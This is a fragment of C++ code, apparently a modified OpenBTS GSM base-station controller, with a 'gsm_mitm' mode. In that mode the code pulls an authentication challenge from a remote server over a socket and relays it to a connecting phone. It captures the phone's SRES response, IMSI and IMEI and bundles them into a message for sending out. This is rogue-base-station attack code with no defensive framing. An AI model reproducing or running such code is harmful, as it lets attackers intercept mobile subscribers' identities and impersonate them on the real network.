...
void Control::LocationUpdatingController(const L3LocationUpdatingRequest* lur, LogicalChannel* DCCH)
{
	...
	//------------------------
	//bool gsm_mitm_state = false;
	//int sock;
	
	
	string Default_RAND = "aaaabbbbccccddddeeeeffffgggghhhh";
	bool sock_flag = true;
	//cout<<"staring chiper........."<<endl;
	//------------------------
	
	// Did we get a RAND for challenge-response?
	
	if(gsm_mitm_is_open()){
		cout<<"gsm_mitm state:open!"<<endl;
    	...
    	if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
	    	...
	    	if (bytes_received > 0) {
	        		RAND = std::string(buffer, bytes_received);
	        }
    	}

		cout <<""<<endl;
        cout <<"sending L3AuthenticationRequest....."<< endl;
        cout <<"================================"<<endl;
        cout << "RAND: "<< RAND <<endl;
		...
		cout << "SRES:"<< SRESstr <<endl;
		cout <<"================================"<<endl;

		
		cout <<""<<endl;
		cout <<"sending L3IdentityRequest........"<< endl;
		DCCH->send(L3IdentityRequest(IMEIType));
		L3Message* msg_1 = getMessage(DCCH);
		L3IdentityResponse *resp_1 = dynamic_cast<L3IdentityResponse*>(msg_1);
		string IMEI = resp_1->mobileID().digits();
		cout <<"================================"<<endl;
		cout <<"IMSI: "<< string(IMSI)<<endl;
		cout <<"IMEI: "<< IMEI <<endl;
		cout <<"================================"<<endl;
		...
		delete msg;
		delete msg_1;
		string message = IMEI+";"+string(IMSI)+";"+SRESstr;
		//-------------------------
